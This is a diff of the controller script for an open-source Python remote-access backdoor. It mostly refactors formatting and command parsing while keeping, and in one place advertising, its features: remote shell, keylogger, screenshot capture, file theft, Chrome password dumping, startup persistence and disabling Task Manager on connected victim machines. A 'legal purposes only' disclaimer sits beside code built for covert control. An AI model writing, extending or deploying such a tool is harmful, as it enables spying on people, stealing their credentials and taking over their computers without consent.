@@ -8,7 +8,11 @@ License: https://github.com/xp4xbox/Python-Backdoor/blob/master/license
 NOTE: This program must be used for legal purposes only! I am not responsible for anything you do with it.
 '''
 
-import socket, os, time, threading, sys
+import socket
+import os
+import time
+import threading
+import sys
 from queue import Queue
 
 intThreads = 2
@@ -24,19 +28,29 @@ intPort = 3000
 intBuff = 1024
 
 # function to return decoded utf-8
-decode_utf8 = lambda data: data.decode("utf-8")
+
+
+def decode_utf8(data): return data.decode("utf-8")
 
 # function to return string with quotes removed
-remove_quotes = lambda string: string.replace("\"", "")
+
+
+def remove_quotes(string): return string.replace("\"", "")
 
 # function to return title centered around string
-center = lambda string, title: f"{{:^{len(string)}}}".format(title)
+
+
+def center(string, title): return f"{{:^{len(string)}}}".format(title)
 
 # function to send encrypted data
-send = lambda data: conn.send(data)
+
+
+def send(data): return conn.send(data)
 
 # function to receive and decrypt data
-recv = lambda buffer: conn.recv(buffer)
+
+
+def recv(buffer): return conn.recv(buffer)
 
 
 def recvall(buffer):  # function to receive large amounts of data
@@ -54,7 +68,8 @@ def create_socket():
     global objSocket
     try:
         objSocket = socket.socket()
-        objSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # reuse a socket even if its recently closed
+        # reuse a socket even if its recently closed
+        objSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     except socket.error() as strError:
         print("Error creating socket " + str(strError))
 
@@ -79,7 +94,8 @@ def socket_accept():
             client_info = decode_utf8(conn.recv(intBuff)).split("`,")
             address += client_info[0], client_info[1], client_info[2],
             arrAddresses.append(address)
-            print("\n" + "Connection has been established: {0} ({1})".format(address[0], address[2]))
+            print(
+                "\n" + "Connection has been established: {0} ({1})".format(address[0], address[2]))
         except socket.error:
             print("Error accepting connections!")
             continue
@@ -142,15 +158,18 @@ def close():
     for intCounter, conn in enumerate(arrConnections):
         conn.send(str.encode("exit"))
         conn.close()
-    del arrConnections; arrConnections = []
-    del arrAddresses; arrAddresses = []
+    del arrConnections
+    arrConnections = []
+    del arrAddresses
+    arrAddresses = []
 
 
 def refresh_connections():  # used to remove any lost connections
     global arrConnections, arrAddresses
     for intCounter, conn in enumerate(arrConnections):
         try:
-            conn.send(str.encode("test"))  # test to see if connection is active
+            # test to see if connection is active
+            conn.send(str.encode("test"))
         except socket.error:
             del arrAddresses[intCounter]
             del arrConnections[intCounter]
@@ -166,13 +185,13 @@ def list_connections():
         for intCounter, conn in enumerate(arrConnections):
 
             strClients += str(intCounter) + 4*" " + str(arrAddresses[intCounter][0]) + 4*" " + \
-                        str(arrAddresses[intCounter][1]) + 4*" " + str(arrAddresses[intCounter][2]) + 4*" " + \
-                        str(arrAddresses[intCounter][3]) + "\n"
+                str(arrAddresses[intCounter][1]) + 4*" " + str(arrAddresses[intCounter][2]) + 4*" " + \
+                str(arrAddresses[intCounter][3]) + "\n"
 
         print("\n" + "ID" + 3*" " + center(str(arrAddresses[0][0]), "IP") + 4*" " +
-            center(str(arrAddresses[0][1]), "Port") + 4*" " +
-            center(str(arrAddresses[0][2]), "PC Name") + 4*" " +
-            center(str(arrAddresses[0][3]), "OS") + "\n" + strClients, end="")
+              center(str(arrAddresses[0][1]), "Port") + 4*" " +
+              center(str(arrAddresses[0][2]), "PC Name") + 4*" " +
+              center(str(arrAddresses[0][3]), "OS") + "\n" + strClients, end="")
     else:
         print("No connections.")
 
@@ -190,8 +209,8 @@ def select_connection(connection_id, blnGetResponse):
         IP, PC Name, OS, User
         '''
         arrInfo = str(arrAddresses[connection_id][0]), str(arrAddresses[connection_id][2]), \
-                                                              str(arrAddresses[connection_id][3]), \
-                                                              str(arrAddresses[connection_id][4])
+            str(arrAddresses[connection_id][3]), \
+            str(arrAddresses[connection_id][4])
 
         if blnGetResponse == "True":
             print("You are connected to " + arrInfo[0] + " ...." + "\n")
@@ -222,7 +241,8 @@ def screenshot():
     print("\n" + strClientResponse)
 
     intBuffer = ""
-    for intCounter in range(0, len(strClientResponse)):  # get buffer size from client response
+    # get buffer size from client response
+    for intCounter in range(0, len(strClientResponse)):
         if strClientResponse[intCounter].isdigit():
             intBuffer += strClientResponse[intCounter]
     intBuffer = int(intBuffer)
@@ -231,9 +251,11 @@ def screenshot():
 
     ScrnData = recvall(intBuffer)  # get data and write it
     objPic = open(strFile, "wb")
-    objPic.write(ScrnData); objPic.close()
+    objPic.write(ScrnData)
+    objPic.close()
 
-    print("Done!!!" + "\n" + "Total bytes received: " + str(os.path.getsize(strFile)) + " bytes")
+    print("Done!!!" + "\n" + "Total bytes received: " +
+          str(os.path.getsize(strFile)) + " bytes")
 
 
 def browse_files():
@@ -313,7 +335,8 @@ def receive():
         return
 
     intBuffer = ""
-    for intCounter in range(0, len(strClientResponse)):  # get buffer size from client response
+    # get buffer size from client response
+    for intCounter in range(0, len(strClientResponse)):
         if strClientResponse[intCounter].isdigit():
             intBuffer += strClientResponse[intCounter]
     intBuffer = int(intBuffer)
@@ -328,7 +351,8 @@ def receive():
         print("Path is protected/invalid!")
         return
 
-    print("Done!!!" + "\n" + "Total bytes received: " + str(os.path.getsize(strFileOutput)) + " bytes")
+    print("Done!!!" + "\n" + "Total bytes received: " +
+          str(os.path.getsize(strFileOutput)) + " bytes")
 
 
 def command_shell():  # remote cmd shell
@@ -369,7 +393,8 @@ def chrpass():  # legal purposes only!
         return
 
     if strClientResponse == "error":
-        strClose = input("Browser is currently in use. Would you like to close it? y/n ")
+        strClose = input(
+            "Browser is currently in use. Would you like to close it? y/n ")
         if strClose == "y":
             send(str.encode("close"))
         else:
@@ -379,6 +404,8 @@ def chrpass():  # legal purposes only!
         intBuffer = int(strClientResponse)
 
     print("\n" + decode_utf8(recvall(intBuffer)))  # print results
+
+# TODO: Add powershell text-to-speach function
 
 
 def keylogger(option):
@@ -429,6 +456,7 @@ def show_help():
     print("--r Receive file from the user")
     print("--s Send file to the user")
     print("--p Take screenshot")
+    print('--g Dump chrome passwords')
     print("--a Run at startup")
     print("--v View files")
     print("--u User Info")
@@ -446,59 +474,74 @@ def send_commands():
     show_help()
     try:
         while True:
-            strChoice = input("\n" + "Type selection: ")
-
-            if strChoice == "--help":
-                print("\n", end="")
-                show_help()
-            elif strChoice == "--c":
-                send(str.encode("exit"))
-                conn.close()
-                break
-            elif strChoice[:3] == "--m" and len(strChoice) > 3:
-                strMsg = "msg" + strChoice[4:]
-                send(str.encode(strMsg))
-            elif strChoice[:3] == "--o" and len(strChoice) > 3:
-                strSite = "site" + strChoice[4:]
-                send(str.encode(strSite))
-            elif strChoice == "--a":
-                startup()
-            elif strChoice == "--u":
-                user_info()
-            elif strChoice == "--p":
-                screenshot()
-            elif strChoice == "--v":
-                browse_files()
-            elif strChoice == "--s":
-                send_file()
-            elif strChoice == "--r":
-                receive()
-            elif strChoice == "--x 1":
-                send(str.encode("lock"))
-            elif strChoice == "--x 2":
-                send(str.encode("shutdown"))
-                conn.close()
-                break
-            elif strChoice == "--x 3":
-                send(str.encode("restart"))
-                conn.close()
-                break
-            elif strChoice == "--b":
-                break
-            elif strChoice == "--e":
-                command_shell()
-            elif strChoice == "--d":
-                disable_taskmgr()
-            elif strChoice == "--g":
-                chrpass()
-            elif strChoice == "--k start":
-                keylogger("start")
-            elif strChoice == "--k stop":
-                keylogger("stop")
-            elif strChoice == "--k dump":
-                keylogger("dump")
+            # Going to improve this more, most likely will add commands to a dictionary
+            # Also improved input handling, split input into list rather than handling by length
+            strChoice = input("\n" + "Type selection: ").split()
+            if not strChoice:
+                continue
+            if len(strChoice) == 1:
+                strChoice = strChoice[0]
+                if strChoice == "--help":
+                    print("\n", end="")
+                    show_help()
+                elif strChoice == "--c":
+                    send(str.encode("exit"))
+                    conn.close()
+                    break
+                elif strChoice == "--p":
+                    screenshot()
+                elif strChoice == "--a":
+                    startup()
+                elif strChoice == "--u":
+                    user_info()
+                elif strChoice == "--v":
+                    browse_files()
+                elif strChoice == "--s":
+                    send_file()
+                elif strChoice == "--r":
+                    receive()
+                elif strChoice == "--b":
+                    break
+                elif strChoice == "--e":
+                    command_shell()
+                elif strChoice == "--d":
+                    disable_taskmgr()
+                elif strChoice == "--g":
+                    chrpass()
+                else:
+                    print("Invalid choice, please try again!")
             else:
-                print("Invalid choice, please try again!")
+                if strChoice[0] == "--m":
+                    strMsg = "msg" + ' '.join(strChoice[1:])
+                    send(str.encode(strMsg))
+                elif strChoice[0] == "--o":
+                    strSite = strChoice[1]
+                    # Opening browser only works if schema is provided
+                    if strSite[:8] != 'https://' and strSite[:7] != 'http://':
+                        print(
+                            'Make sure to add schema properly. (https:// or http://)')
+                        continue
+                    send(str.encode(strSite))
+                elif strChoice[0] == "--x":
+                    if strChoice[1] == '1':
+                        send(str.encode("lock"))
+                    elif strChoice[1] == "2":
+                        send(str.encode("shutdown"))
+                        conn.close()
+                        break
+                    elif strChoice[1] == "3":
+                        send(str.encode("restart"))
+                        conn.close()
+                        break
+                elif strChoice[0] == "--k":
+                    if strChoice[1] == 'start':
+                        keylogger("start")
+                    elif strChoice[1] == "stop":
+                        keylogger("stop")
+                    elif strChoice[1] == "dump":
+                        keylogger("dump")
+                else:
+                    print("Invalid choice, please try again!")
 
     except socket.error as e:  # if there is a socket error
         print("Error, connection was lost! :" + "\n" + str(e))
@@ -535,6 +578,7 @@ def create_jobs():
     for intThread in arrJobs:
         queue.put(intThread)  # put thread id into list
     queue.join()
+
 
 create_threads()
 create_jobs()
